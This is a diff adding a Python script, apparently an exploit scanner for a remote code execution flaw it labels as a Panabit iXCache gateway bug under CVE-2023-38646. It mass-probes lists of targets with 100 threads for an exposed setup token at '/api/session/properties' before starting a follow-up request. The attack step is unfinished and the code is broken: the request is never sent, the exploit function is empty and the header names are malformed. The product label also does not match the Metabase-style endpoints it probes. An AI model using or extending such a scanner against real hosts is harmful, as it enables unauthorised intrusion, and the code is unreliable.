@@ -1,0 +1,56 @@
+import argparse,requests,sys,re,os,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+
+def banner():
+    text = """██████╗  █████╗ ███╗   ██╗ █████╗ ██████╗ ██╗████████╗     ██████╗  ██████╗███████╗
+██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██║╚══██╔══╝     ██╔══██╗██╔════╝██╔════╝
+██████╔╝███████║██╔██╗ ██║███████║██████╔╝██║   ██║        ██████╔╝██║     █████╗  
+██╔═══╝ ██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║   ██║        ██╔══██╗██║     ██╔══╝  
+██║     ██║  ██║██║ ╚████║██║  ██║██████╔╝██║   ██║███████╗██║  ██║╚██████╗███████╗
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝
+                                                                                   
+                                          version = 1.0.0                          
+"""
+    print(text)
+
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="Panabit iXCache网关RCE漏洞CVE-2023-38646")
+    parser.add_argument('-u','--url',type=str,dest='url',help='please input your url')
+    parser.add_argument('-f', '--file', type=str, dest='file', help='please input your file')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        if poc(args.url):
+            exp(args.url)
+    elif args.file and not args.url:
+        file_url = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                file_url.append(url.strip())
+        mp = Pool(100)
+        mp.map(poc,file_url)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+
+def poc(target):
+    payload = '/api/session/properties'
+    res1 = requests.get(url=target+payload,verify=False,timeout=10)
+    if res1.status_code == 200 and 'setup-token' in res1.text:
+        payload1 = '/api/setup/validate'
+        headser = {
+            'Content - Type': 'application / json',
+            'Content - Length': '812',
+        }
+        data = {}
+def exp(target):
+    pass
+
+
+if __name__ == "__main__":
+    main()
